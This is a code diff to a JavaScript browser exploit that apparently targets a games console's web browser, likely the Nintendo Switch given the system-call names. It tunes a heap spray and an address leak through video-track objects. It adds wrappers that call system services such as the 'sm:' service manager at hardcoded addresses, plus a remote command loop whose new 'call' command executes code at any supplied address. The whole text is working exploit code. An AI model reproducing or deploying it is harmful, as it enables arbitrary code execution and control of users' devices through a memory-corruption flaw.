@@ -34,17 +34,20 @@ function log (msg) {
   send(msg === undefined ? 'undefined' : "[log] "+msg.toString())
 }
 
+var bDebug = false;
 function debug (msg) {
-  send(msg === undefined ? 'undefined' : "[deb] "+msg.toString())
+    if(bDebug){
+        send(msg === undefined ? 'undefined' : "[deb] "+msg.toString())
+    }
 }
  
 
 //--------------------Leak---------------------------------//
 //global
 //global to use this after
-var sprayCount = 0x30000;
+var sprayCount = 0x20000;
 var ar = new Array(sprayCount);
-var vrs = new Array(1);
+var vrs = new Array(100);
 var vict = null;
 function leakAddrs (obja, objb, objc, cb)
 {
@@ -126,7 +129,7 @@ function leakAddrs (obja, objb, objc, cb)
         for(var i=0; i<vrs.length; i++){
             vict = vrs[i].track.kind;
             log("len: "+vict.length);
-            if(vict.length > 2000000){
+            if(vict.length == 2101769){
                 
                 addrOfObjA = [__read32(vict, 0), __read32(vict, 2)];
                 addrOfObjB = [__read32(vict, 4), __read32(vict, 6)];
@@ -826,6 +829,32 @@ getTLS = function() {
   return call(0x3ACE54, []);
 }
 
+function svcExitProcess()
+{
+  return call(0x3BBE50, []);
+}
+
+function svcConnectToNamedPort()
+{
+    var pPortName = malloc(0x10);
+    var hService = [0xFFFFFFFF, 0xFFFFFFFF];
+    write4(0x003A6D73, pPortName); //sm:
+    var pHandle = malloc(0x10);
+    var bResult = call(0x3BBF70, [pHandle, pPortName]);
+    if(eq(bResult, [0,0])){
+        hService = [read4(pHandle), 0];
+    }
+    free(pHandle)
+    free(pPortName);
+    return hService;
+}
+
+function svcSendSyncRequestWithUserBuffer(hHandle, pBuffer, iSize)
+{
+    var bResult = call(0x3BBF90, [pBuffer, iSize, hHandle]);
+    return eq(bResult, [0, 0]);
+}
+
 //min main
 function loadRun (obj)
 {
@@ -844,10 +873,6 @@ function loadRun (obj)
     
     getSP();
     
-    log(getTLS());
-
-    
-    
     var objM = new VTTRegion();
     var v = document.createElement("video");
     v.appendChild(document.createElement("track"));
@@ -860,6 +885,10 @@ function loadRun (obj)
     //vict = null;
     log("vict: " + convert8(getAddr(vict)));
     
+    hService = svcConnectToNamedPort();
+    
+    log(svcSendSyncRequestWithUserBuffer(hService, malloc(0x1000), 0x1000));
+        
     while(true)
     {
         data = recv()
@@ -946,6 +975,10 @@ function loadRun (obj)
                 }
             }
             log("search8: OK");
+        }else if(cmd == "call"){
+        
+            var addr = parse8(extend8(args[1]));
+            log(call(addr[0], []));
         }else{
             send("unknow cmd");
         }
